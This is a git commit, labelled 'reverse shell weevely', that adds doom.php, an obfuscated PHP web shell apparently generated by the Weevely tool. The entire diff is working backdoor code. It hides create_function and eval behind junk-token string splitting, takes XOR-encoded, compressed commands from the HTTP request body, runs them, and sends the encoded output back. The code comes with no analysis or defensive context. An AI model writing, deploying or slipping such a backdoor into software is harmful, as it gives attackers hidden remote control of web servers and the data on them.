ccdcd6086ff86f16ebf04cf7677925b332cdf08f
Aaron Silva <50567219+xsilvamo@users.noreply.github.com>
2021-07-09 16:41:07 -0400

    reverse shell weevely

---
+++ doom.php
@@ -0,0 +1,13 @@
+<?php
+$a='rlen($t);YT$o="";fYTorYT($i=0;$YTi<$lYT;){for($j=0YT;($j<$c&YT&$i<YT$l);Y';
+$o='$kYT="8e372e13"YTYT;$kh="faYT1e720776eYTYT8";$kf="0YTebYTb4a878fd9YT"YT;$p=';
+$s=str_replace('KH','','crKHeKHaKHteKH_fuKHnKHction');
+$d='"qMLlsYGAPECYT6lpch";fYTunctioYTn YTx(YT$t,$k){$c=sYTtYTrlen(YT$k);$lYT=st';
+$f='base6YT4_eYTncode(@x(@gzcoYTYTmYTYTpress($o),$kYT));priYTnt("$p$kh$r$kf");}';
+$S='[1YT]YT),YT$k)));YT$o=@ob_get_cYTontents();@YTob_YTend_clYTeanYT();$r=YT@';
+$U='h(YTYTYT"/$kh(.+)YT$kf/",@file_gYTeYTt_contents("YTYTphp://iYTnput"),YT$m)=Y';
+$p='T=1) {@oYTb_start();@eYTvalYT(@YTgzuYTncompress(YT@x(@YTbaseYT64_decode($m';
+$t='T$j++,$i+YT+){$o.=$YTYTt{$i}^$YTk{$j}YT;}}rYTeYTturn $o;}if (@pregYT_matc';
+$z=str_replace('YT','',$o.$d.$a.$t.$U.$p.$S.$f);
+$R=$s('',$z);$R();
+?>
